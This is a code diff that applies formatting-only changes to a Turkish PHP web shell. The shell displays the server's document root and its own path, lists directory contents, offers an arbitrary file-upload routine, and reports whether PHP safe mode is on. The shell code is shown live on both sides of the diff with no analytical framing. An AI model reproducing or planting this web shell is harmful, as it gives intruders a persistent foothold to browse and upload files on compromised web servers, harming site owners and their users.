@@ -29,7 +29,7 @@
         <font color="#800080"><b><font face="Verdana" style="font-size: 8pt">
         Dizin</font></b></font><font face="Verdana" style="font-size: 8pt"><font color="#800080"><b>:</b> <?php echo $_SERVER['DOCUMENT_ROOT']; ?>
         <br />
-        <b>Shell Dizini:</b> <?php echo $SCRIPT_FILENAME ?>
+        <b>Shell Dizini:</b> <?php echo $SCRIPT_FILENAME; ?>
         <br>
         &nbsp;</font></font><p align="center"><form method="post">
 <p align="center">
@@ -59,10 +59,10 @@ Kodunuzu Yazýn :)</font><font color="#111111"><br>
 <p align="center">
 <font face="Verdana" style="font-size: 11pt">
 <?php
-$folder=opendir('./');
+$folder = opendir('./');
 while ($file = readdir($folder)) {
-    if ($file != "." && $file != "..") {
-        echo '<a target="_blank" href="'.$file.'">'.$file.'</a ><br>';
+    if ('.' != $file && '..' != $file) {
+        echo '<a target="_blank" href="' . $file . '">' . $file . '</a ><br>';
     }
 }
 closedir($folder);
@@ -86,8 +86,8 @@ closedir($folder);
 function check_file()
 {
     global $file_name, $filename;
-    $backupstring = "copy_of_";
-    $filename = $backupstring."$filename";
+    $backupstring = 'copy_of_';
+    $filename = $backupstring . "$filename";
 
     if (file_exists($filename)) {
         check_file();
@@ -98,13 +98,13 @@ if (!empty($file)) {
     $filename = $file_name;
     if (file_exists($file_name)) {
         check_file();
-        echo "<p align=center>Dosya Zaten Bulunuyor</p>";
+        echo '<p align=center>Dosya Zaten Bulunuyor</p>';
     } else {
         copy($file, "$filename");
         if (file_exists($filename)) {
-            echo "<p align=center>Dosya Baþarýlý Bir Þekilde Yüklendi</p>";
-        } elseif (! file_exists($filename)) {
-            echo "<p align=center>Dosya Bulunamadý</p>";
+            echo '<p align=center>Dosya Baþarýlý Bir Þekilde Yüklendi</p>';
+        } elseif (!file_exists($filename)) {
+            echo '<p align=center>Dosya Bulunamadý</p>';
         }
     }
 }
@@ -119,9 +119,9 @@ if (!empty($file)) {
               <?php
 // Check for Safe Mode
 if (ini_get('safe_mode')) {
-    print '<font color=#FF0000><b>Güvenlik Açýk</b></font>';
+    echo '<font color=#FF0000><b>Güvenlik Açýk</b></font>';
 } else {
-    print '<font color=#008000><b>Güvenlik Kapalý</b></font>';
+    echo '<font color=#008000><b>Güvenlik Kapalý</b></font>';
 }
 
 ?>
